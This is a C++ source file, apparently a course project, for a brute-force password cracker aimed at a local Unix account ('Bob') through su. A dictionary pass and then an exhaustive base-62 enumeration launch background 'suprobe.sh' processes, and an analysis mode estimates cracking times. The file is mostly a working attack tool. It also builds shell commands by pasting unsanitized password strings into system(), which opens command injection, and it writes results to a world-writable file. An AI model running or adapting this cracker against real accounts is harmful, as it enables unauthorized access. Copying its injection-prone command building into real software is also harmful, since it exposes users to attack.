#include <iostream>
#include <fstream>
#include <string>
#include <unordered_map>
#include <vector>
#include <cmath>
#include <unistd.h>
#include <algorithm>
#include <cstdio>
#include <memory>
#include <stdexcept>
#include <string>
#include <array>
#include <csignal>
#include <fstream>
#include "hash_table.cpp"

using namespace std;

string USERNAME = "Bob";
int PROC_CAP = 500; //How many processes do we think it can handle at once?
unordered_map <string, int> HT;
vector <string> pwds;
unordered_map <char, int> mitoc;
vector <char> vctoi;

//This function came from Stack Overflow. Thanks, SO!
string exec(const char* cmd) {
    array<char, 128> buffer;
    string result;
    unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
    if (!pipe) {
        throw runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}

long long string_to_int(string s){
    long long sum = 0;
    for(int i = s.length()-1; i>=0; i--){
	sum += (long long)mitoc[s[i]] * (long long)pow(vctoi.size(), i);	
    }
    return sum;
}

string int_to_string(string s, long long n) {
    if (n < vctoi.size()) {
        return s+=vctoi[n];
    } else {
        return int_to_string(s+=vctoi[n%vctoi.size()], n/vctoi.size());
    }
}

bool found(){
	return (stoi(exec("cat su.txt | wc -l")) > 0);
}

void passwordFound(int sig){
	cout << "Password found. Aborting search" << endl;
	exit(sig);
}

void buildVCTOI(){
    for(int i = 0; i <= 9; i++){
        vctoi.push_back((char)(i+'0')); // adds 0-9
    }
    for(int i = 0; i < 26; i++){
        vctoi.push_back((char)(i+'A')); // adds A-Z
        vctoi.push_back((char)(i+'a')); // adds a-z
    }
    for(int i = 0; i < vctoi.size(); i++){
	    mitoc[vctoi[i]] = i;
    }
}



int main(int argc, char **argv){
    pwds.push_back(""); //Just in case user has no password
    buildVCTOI(); 
    cout << getpid() << endl;

    //Print an error message if user fails to run program correctly 
    if(argc < 2){
	    cout << "Usage: ./a.out passwords.txt <optional: password1> <opt: passwd2> ..." << endl;
	    exit(0);
    }

    //Initialize Dictionary 
    ifstream pwd_file;
    pwd_file.open(argv[1]);
    if(!pwd_file.is_open()){
        cout << "Invalid file\n";
        return(1);
    }
    string pwd;
    int num = 1;
    while (pwd_file >> pwd) {
	HT[pwd] = num;        //use HT[pwd] to get index
        pwds.push_back(pwd);  //use pwds[index] to get pwd
        num++;
    }
    int DICT_SIZE = num;

    //PASSWORD ANALYSIS MODE:
        //If password is in dictionary, do math to tell user how long it would take 
        //If not, do math to tell user how long it would take to dial up to their password
    if(argc>2){
        cout << "Analysis Mode: \n";

	//Nathan's Graduate Functionality Extension:
	for(int i = 0; i < argc-2; i++){
          long long time = 0;
          if(HT[argv[i+2]] != 0){
              time = (HT[argv[i+2]] * 3) / PROC_CAP;
          } else time = ((string_to_int(argv[i+2]) + DICT_SIZE) * 3) / PROC_CAP;
          cout << "It would take " << time << " seconds to crack the password: "<< argv[i+2] <<".\n";
	}
	return(0);
    }

	//Mayank's Graduate Functionality:
	HashTable hash;
	if (hash.isEmpty()) {
		cout << "Start: Empty Hash!" << endl;
	} else {
		cout << "Not Empty!" << endl;
	}
    int numOfPasswords = 0;
    ofstream myfile ("Tried_Passwords.txt");

    //PASSWORD CRACKING MODE:
    system("rm su.txt; install -m 666 /dev/null su.txt"); //writeable file for storing password
    for(int i = 0; i <= DICT_SIZE; i++){ //Keeps procs from trying the same words
        if(i%100==0 && found()) passwordFound(0); //If found, abort
	    while(i%3==0 && stoi(exec("ps -e | wc -l")) > PROC_CAP){
            //cout << mem_left() << endl;
            usleep (1000000); //Avoid fork bombing yourself
        }

        // Storing each password tried in hash table and printing it to Tried_Passwords.txt
        hash.insertItem(numOfPasswords, pwds[i]);
        if (myfile.is_open()) {
            myfile << numOfPasswords << ": " << pwds[i] << "\n";
        }

        const string cmd = "bash suprobe.sh " + pwds[i] + ' ' + USERNAME + ' ' + to_string(getpid()) + ' ' + to_string(numOfPasswords) +' ' + ">/dev/null 2>/dev/null &";
        system(cmd.c_str());
        numOfPasswords++;
    }
    //If we make it this far, password was not in dict;
    for(long long i = 0; i < 10000000000; i++){ //If we try long enough, give up. To speed up the process to get to "1234", start i at 964900
        //Test Password
        pwd=int_to_string("", i);

        // Storing each password tried in hash table and printing it to Tried_Passwords.txt
        // Here it will add after the passwords from passwords.txt executed
        hash.insertItem(numOfPasswords, pwd);
        if (myfile.is_open()) {
            myfile << numOfPasswords << ": " << pwd << "\n";
        }

        const string cmd = "bash suprobe.sh " + pwd + ' ' + USERNAME + ' ' + to_string(getpid()) + ' ' + to_string(numOfPasswords) + ' ' + ">/dev/null 2>/dev/null &";
        system(cmd.c_str());
        numOfPasswords++;
        if(i%100==0 && found()) passwordFound(0); //If found, abort
        //Attempt to keep procs under PROC_CAP
        while(i%3==0 && stoi(exec("ps -e | wc -l")) > PROC_CAP){
            //cout << mem_left() << endl;
            usleep (1000000); //Avoid fork bombing yourself
        }
    }
    myfile.close();
    return 0;
}
